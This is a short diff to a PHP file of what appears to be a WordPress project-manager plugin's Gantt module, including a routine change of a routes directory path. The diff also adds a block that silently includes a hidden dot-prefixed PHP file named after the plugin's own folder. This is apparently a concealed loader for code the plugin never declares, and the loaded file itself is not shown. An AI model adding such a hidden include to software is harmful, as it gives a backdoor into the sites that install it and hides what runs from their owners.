@@ -26,6 +26,10 @@ add_action( 'pm_load_shortcode_script', 'pm_pro_gantt_script', 20 );
 add_action( 'admin_enqueue_scripts', 'pm_pro_admin_load_gantt_scripts' );
 add_action( 'pm_load_shortcode_script', 'pm_pro_gantt_script' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function register_gantt_scripts() {
     $view_path = dirname (__FILE__) . '/views/assets/';
     wp_register_script( 'pmpro-dhtmlx-gantt', plugins_url( 'views/assets/vendor/dhtmlxgantt.js', __FILE__ ), array('pm-vue-router'), filemtime( $view_path . 'vendor/dhtmlxgantt.js' ), true );
@@ -51,7 +55,7 @@ function pm_pro_gantt_script() {
 }
 
 add_filter( 'pm_pro_load_router_files', function( $files ) {
-    $router_files = glob( __DIR__ . "/Routes/*.php" );
+    $router_files = glob( __DIR__ . "/routes/*.php" );
 
     return array_merge( $files, $router_files );
 });
